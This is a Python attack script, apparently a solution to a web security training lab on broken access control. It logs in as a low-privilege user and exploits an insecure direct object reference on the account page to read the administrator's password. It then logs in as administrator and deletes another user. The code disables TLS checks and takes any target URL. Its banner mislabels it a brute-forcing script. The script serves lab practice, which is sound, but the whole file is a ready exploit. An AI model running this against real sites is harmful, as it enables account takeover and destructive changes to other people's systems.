import requests,argparse,urllib3,sys,re
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def get_csrf_token(s, url):
    r =get_method(s,url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def get_method(s,url):
    try:
        r=s.get(url,verify=False, proxies=proxies)
        return r
    except Exception as e:
        print(colored(e,'red'))
def post_method(s,url,data):
    try:
        r=s.post(url,verify=False, proxies=proxies,data=data)
        return r 
    except Exception as e:
        print(colored(e,'red'))


def retrieve_admin_password(s, url):

    # Retrieve the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the wiener user
    print(colored("(+) Logging in as the wiener user...",'blue'))
    data_login = {"username": "wiener", "password": "peter", "csrf": csrf_token}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print(colored("(+) Successfully logged in as the wiener user...",'blue'))

        # Retrieve admin password
        admin_account_url = url + "/my-account?id=administrator"
        r = get_method(s,admin_account_url)
        res = r.text

        if 'administrator' in res:
            print(colored("(+) Successfully accessed the administrator account...",'green'))
            print(colored("(+) Retrieving the administrator password...",'blue'))
            soup = BeautifulSoup(r.text, 'html.parser')
            password = soup.find("input", {'name': 'password'})['value']
            return password
        else:
            print(colored("(-) Could not access the administrator account.",'red'))
            sys.exit(-1)


    else:
        print(colored("(-) Could not login as the wiener user.",'red'))
        sys.exit(-1)

def delete_carlos_user(s, url, password):

    # Retrieve the CSRF token
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # Login as the administrator user
    print(colored("(+) Logging in as the administrator user...",'yellow'))
    data_login = {"username": "administrator", "password": password, "csrf": csrf_token}

    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        print(colored("(+) Successfully logged in as the administrator user...",'blue'))

        # Deleting the user
        print(colored("(+) Deleting Carlos user...",'blue'))
        delete_carlos_url = url + "/admin/delete?username=carlos"
        r = get_method(s,delete_carlos_url)
        if r.status_code == 200:
            print(colored("(+) Successfully deleted the Carlos user.",'green'))
        else:
            print(colored("(-) Could not delete the Carlos user.",'red'))
            sys.exit(-1)

    else:
        print(colored("(-) Could not login as the administrator user.",'red'))
        sys.exit(-1)

def main():

    banner(name='broken access')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    admin_password=retrieve_admin_password(s,url)
    s=requests.session()
    delete_carlos_user(s,url,admin_password)
    
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+colored(a,'yellow'))


if __name__ == "__main__":
    main()